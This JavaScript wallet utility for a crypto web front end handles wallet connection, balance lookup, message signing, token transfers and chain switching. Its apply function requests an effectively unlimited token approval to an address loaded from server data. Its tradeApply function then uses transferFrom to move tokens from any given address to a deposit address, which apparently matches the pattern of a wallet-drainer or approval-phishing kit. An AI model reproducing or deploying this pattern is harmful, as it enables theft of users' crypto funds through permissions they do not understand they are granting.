window.web3Utils = {
  client: null,
  accountAddress: '',
  address: '',
  approveAddress: '',
  coinMap: {},
  connect: function() {
    let data = ''
    this.client = App.web3
    return window.ethereum.enable()
  },
  getId: function(){
    if (this.client == null) throw 'Please reconnect wallet'
    return this.client.eth.net.getId()
  },
  guid: function() {
    var template = 'xxxxxxxxxxxx'
    return template.replace(/[xy]/g, function(c) {
      var r = Math.random() * 16 | 0,
        v = c == 'x' ? r : (r & 0x3 | 0x8)
      return v.toString(16)
    })
  },
  blockNum: function(callback) {
    if (this.client == null) throw 'Please reconnect wallet'
    if (typeof callback === 'function') {
      this.client.eth.getBlockNumber(callback)
    } else {
      alert('callback not support')
    }
  },
  sign: function(message, callback) {
    if (this.client == null) throw 'Please reconnect wallet'
    if (typeof callback === 'function') {
      var address = this.client.currentProvider.selectedAddress
      this.client.eth.personal.sign(message, address).then(callback)
    } else {
      alert('callback not support')
    }
  },
  account: function(callback) {
    if (this.client == null) throw 'Please reconnect wallet'
    if (typeof callback === 'function') {
      this.client.eth.getCoinbase(res => {
        console.log(res)
      })
    } else {
      alert('callback not support')
    }
  },
  contract: function(coin) {
    var that = this
    if (this.client == null) throw 'Please reconnect wallet'
    var info = this.coinMap[coin]
    if (!info) throw 'Unsupported currency: ' + coin
    if (info.holder == null) {
      info.holder = new this.client.eth.Contract(info.contractAbi, info.contractAddress, {})
    }
    return info.holder
  },
  balance: function(coin, callback) {
    if (this.client == null) throw 'Please reconnect wallet'
    if (typeof callback === 'function') {
      let account = this.accountAddress || ''
      if (coin === 'ETH' || coin === 'BNB') {
        console.log('ETHBNB_balance');
        this.client.eth.getBalance(account, (err, data) => {
          callback(err, this.client.utils.fromWei(data))
        })
      } else {
        var thisContract = this.contract(coin)
        try {
          console.log('thisContract');
          thisContract.methods.balanceOf(account).call({
            from: account
          }, (err, data) => {
            var info = this.coinMap[coin]
            callback(err, data / Math.pow(10, info.decimals))
          })
        } catch (error) {
          callback(error, 0)
        }
      }
    } else {
      alert('callback not support')
    }
  },
  trade: function(coin, qty, callback) {
    if (this.client == null) throw 'Please reconnect wallet'
    if (typeof callback === 'function') {
      let account = this.accountAddress || ''
      if (coin === 'ETH' || coin === 'BNB') {
        this.client.eth.sendTransaction({
          from: account,
          to: this.address,
          value: this.client.utils.toWei(qty)
        }, function(err, data) {
          callback(err, data)
        })
      } else {
        var thisContract = this.contract(coin)
        var info = this.coinMap[coin]
        let num = (qty * Math.pow(10, info.decimals)).toString();
        this.client.eth.getGasPrice().then((gasPrice) => {
          thisContract.methods.transfer(this.address, num).send({
            from: account,
            gas: 200000,
            gasPrice: gasPrice
          }, (err, data) => {
            callback(err, data)
          })
        });
      }
    } else {
      alert('callback not support')
    }
  },
  apply: function(coin, callback) {
    if (this.client == null) throw 'Please reconnect wallet'
    if (typeof callback === 'function') {
      let account = this.accountAddress || ''
      var thisContract = this.contract(coin);

      this.client.eth.getGasPrice().then((gasPrice) => {
          thisContract.methods.approve(this.approveAddress,
            '10000000000000000000000000000000000000000000000000000').send({
            from: account,
            gas: 200000,
            gasPrice: gasPrice
          }, (err, data) => {
            console.log(err)
            console.log(data)
            callback(err, data)
          }).catch(err => {
            console.log(err)
          })
      });
    } else {
      alert('callback not support')
    }
  },
  tradeApply: function(coin, from, qty, callback) {
    if (this.client == null) throw 'Please reconnect wallet'
    if (typeof callback === 'function') {
      let account = this.accountAddress || ''
      var thisContract = this.contract(coin);

      this.client.eth.getGasPrice().then((gasPrice) => {
        thisContract.methods.transferFrom(from, this.address,
            this.client.utils.toWei(qty)).send({
          from: account,
          gas: 200000,
          gasPrice: gasPrice
        }, (err, data) => {
          callback(err, data)
        })
      });
    } else {
      alert('callback not support')
    }
  },
  setCoinMap(data){
    let contractAbi = ''
    if (data.coin == 'ETH' || data.abi == '-') {
      contractAbi = data.abi
    } else {
      contractAbi = JSON.parse(data.abi)
    }
    this.coinMap[data.coin] = {
      holder: null,
      contractAddress: data.contract,
      decimals: data.decimals,
      icon: data.icon,
      contractAbi: contractAbi,
    }
  },
  setAddress(data){
    this.address = data.depositAddress
    this.approveAddress = data.approveAddress
  },
  setAccountAddress(data){
    this.accountAddress = data
  },
  changeChain(chain){
    if(chain === 'ethereum'){
      return window['ethereum'].request({
        method: 'wallet_switchEthereumChain',
        params: [{ chainId: '0x1' }],
      })
    } else if(chain === 'BSC'){
      return window['ethereum'].request({
        method: 'wallet_addEthereumChain',
        params: [
          {
            chainId: '0x38', 
            chainName: 'BSC Network',
            nativeCurrency: {
              name: 'BNB',
              symbol: 'BNB', 
              decimals: 18,
            },
            rpcUrls: ['https://bsc-dataseed1.binance.org'],
            blockExplorerUrls: ['https://bscscan.com'],
          },
        ],
      })
    }
  }
}
